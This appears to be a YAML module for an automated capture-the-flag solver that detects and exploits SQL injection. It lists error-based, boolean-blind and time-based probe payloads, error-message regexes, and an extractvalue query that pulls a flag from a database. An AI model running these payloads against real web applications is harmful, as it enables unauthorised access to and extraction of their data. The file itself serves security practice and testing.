id: web_sqli
name: SQL Injection
category: web
version: "1.1"
author: system
description: >
  Detects and exploits SQL injection via error-based, boolean-blind,
  time-based, and union-based techniques.
tags:
  - sqli
  - sql-injection
  - blind-sqli
  - error-based
estimated_duration_seconds: 35

applies_when:
  - "context.challenge.type == 'web'"

confidence_seeds:
  - if: "'/login' in context.found_paths or '/admin' in context.found_paths"
    boost: 0.25
    label: "Sensitive path found"
  - if: "'php' in context.tech_stack or 'asp' in context.tech_stack"
    boost: 0.15
    label: "Server-side language detected"
  - if: "any(p in context.params for p in ['id','user','item','cat','page'])"
    boost: 0.20
    label: "Numeric/ID-style parameter found"

detection:
  min_confidence: 0.10
  paths:
    - id: error_based
      name: "Error-Based Detection"
      steps:
        - id: single_quote_probe
          action: http_probe
          with:
            payloads: ["'", "''", '"', '`', "%27", "%2527"]
            inject_into: all_params
            mutation_families: [param_remove, value_empty]
            target_selector: all_inputs
            mutation_budget:
              max_total_variants: 12
              max_per_family: 4
          signals:
            - match:
                condition: "response.status in [400, 500] and re.search(r'SQL syntax|mysql_fetch_array|ORA-[0-9]+|sqlite.*error|pg_query|SQLSTATE', response.body, re.I)"
              on_match:
                confidence_boost: 0.85
                emit: error_based_confirmed

    - id: boolean_based
      name: "Boolean-Based Blind Detection"
      steps:
        - id: true_false_probe
          action: http_probe
          with:
            true_payload: "' AND 1=1--"
            false_payload: "' AND 1=2--"
            inject_into: all_params
          signals:
            - match:
                condition: "response_delta.status_changed or (true_response.body != false_response.body and response_delta.body_similarity_score >= 0.75) or response_delta.auth_state_changed"
              on_match:
                confidence_boost: 0.70
                emit: boolean_based_confirmed

    - id: time_based
      name: "Time-Based Blind Detection"
      steps:
        - id: sleep_probe
          action: http_probe
          with:
            payloads: ["' AND SLEEP(3)--", "'; SELECT pg_sleep(3)--", "' WAITFOR DELAY '0:0:3'--", "' OR pg_sleep(3)--"]
            inject_into: all_params
          signals:
            - match:
                condition: "response_time >= 3000 and response.status in [200, 500]"
              on_match:
                confidence_boost: 0.65
                emit: time_based_confirmed

exploitation:
  stop_on_flag: true
  paths:
    - id: error_extract
      name: "Error-Based Data Extraction"
      requires_signal: error_based_confirmed
      technique: error_based
      steps:
        - id: extract_flag
          action: http_probe
          with:
            payload: "' AND extractvalue(1,concat(0x7e,(SELECT flag FROM flags LIMIT 1)))--"
            inject_into: vulnerable_param
